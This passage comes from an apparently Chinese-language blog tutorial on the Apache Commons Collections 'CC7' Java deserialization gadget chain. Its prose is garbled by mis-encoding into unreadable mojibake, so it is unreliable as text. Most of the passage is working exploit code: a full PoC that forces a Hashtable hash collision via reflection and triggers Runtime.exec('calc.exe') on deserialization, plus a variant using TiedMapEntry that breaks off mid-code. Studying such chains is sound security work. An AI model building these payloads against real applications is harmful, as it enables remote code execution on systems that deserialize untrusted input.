<p>è¿™é‡Œæˆ‘ä»¬æ˜¯è¦hashä¸º0å˜›ï¼Œå› ä¸ºæ·»åŠ äº†ä¸ª<code>(yy,1)</code>ï¼Œæˆ‘ä»¬åˆ†æçŸ¥é“è¿™ä¸ª<code>value:1</code>æ˜¯å›ºå®šï¼Œç„¶åhashä¸º<code>0</code>ï¼Œæ„Ÿè§‰åˆ°äº†ä¹ˆï¼Œæˆ‘ä»¬ç¬¬1ä¸ª<code>put(1,1)</code>,åé¢æ·»åŠ çš„ä¸å°±æ˜¯<code>(1,1)</code>ä¹ˆ,è¿™å¯¹å€¼çš„hashä¸ä¹Ÿæ˜¯<code>0</code>ä¹ˆ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;zz&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zz&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>ç»“æœæ˜¯å†·é…·çš„ï¼Œåœ¨equalsä¸­ï¼Œåˆ°<code>AbstractMap#equals</code>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸¤ä¸ª<code>valueå€¼ä¸ç›¸ç­‰</code>æ‰ä¼šè¿”å›<code>false</code>å¤–é¢è¿™ä¸ª<code>value</code>æ˜¯ç¬¬ä¸€ä¸ªlazyMap1.putçš„<code>value</code>ï¼Œå¦‚æœæ˜¯ä¸Šè¿°ä»£ç çš„è¯è¿™é‡Œå°±æ˜¯<code>1</code>ï¼ˆè¿™é‡Œæˆªçš„æ˜¯å€¼ä¸º2çš„å›¾ï¼‰ï¼Œç„¶åm.getè¿”å›çš„å€¼åˆæ˜¯<code>1</code>ï¼Œè¿™é‡Œå°±è¿”å›<code>true</code></p>
<p><img loading="lazy" src="../images/image-20241111180218755.png" alt="image-20241111180218755"  />
</p>
<p>è¿”å›trueçš„è¯ï¼Œå°±ä¼šè¿›å…¥ifï¼Œç„¶åè¿™é‡Œ<code>Hashtable</code>ä¹Ÿä¸ä¼šæ‰§è¡Œ<code>addEntry()</code>æ·»åŠ å€¼äº†ï¼Œè¿™é‡Œåªä¼šä¿®æ”¹æ‰ä¹‹å‰å¯¹åº”çš„valueï¼Œè¿™é‡Œå°†<code>B</code>ä¿®æ”¹æˆ<code>2B</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241111180849138.png" alt="image-20241111180849138"  />
</p>
<p>æ‰€ä»¥è¿™é‡Œputç”¨<code>1</code>æ˜¯ä¸è¡Œäº†ï¼Œå°±è¿™æ ·ç»“æŸäº†ä¹ˆï¼ŸNOï¼Œç«Ÿç„¶å½’æ ¹æ˜¯<code>addEntry()</code>åœ¨æ·»åŠ ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è¿™ä¸ªæ–¹æ³•æ·»åŠ ä¸å°±è¡Œäº†ï¼Œè¿˜ç»•è¿‡<code>put()</code>è¿™å±‚ï¼Œåè€Œè·Ÿ<code>è§£å†³ä¸€</code>çš„æ€è·¯ä¸€æ ·äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;zz&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zz&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//hashtable.put(lazyMap2, &#34;2B&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//lazyMap2.remove(2);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">addEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashtable</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;addEntry&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">addEntry</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">addEntry</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashtable</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h5 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.AbstractMapDecorator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.AbstractMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC7_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc.exe&#34;</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">transformerChain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">innerMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">innerMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">innerMap3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;zz&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zz&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//hashtable.put(lazyMap2, &#34;2B&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//lazyMap2.remove(2);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">addEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashtable</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;addEntry&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">addEntry</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">addEntry</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashtable</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="å­˜æ¡£2-æ”¹ç¼–cc7">å­˜æ¡£2 æ”¹ç¼–CC7<a hidden class="anchor" aria-hidden="true" href="#å­˜æ¡£2-æ”¹ç¼–cc7">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Gadget</span><span class="w"> </span><span class="n">chain</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Hashtable</span><span class="p">.</span><span class="na">readObject</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Hashtable</span><span class="p">.</span><span class="na">reconstitutionPut</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">keyvalue</span><span class="p">.</span><span class="na">TiedMapEntry</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">keyvalue</span><span class="p">.</span><span class="na">TiedMapEntry</span><span class="p">.</span><span class="na">getValue</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>å‰é¢æˆ‘ä»¬CC6ä¸æ˜¯ä¹Ÿç”¨äº†hashCodeä¹ˆï¼Œè¿™é‡Œæˆ‘ä»¬ç»“åˆä¸€ä¸‹</p>
<p><img loading="lazy" src="../images/image-20241108110120803.png" alt="image-20241108110120803"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC7_2</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
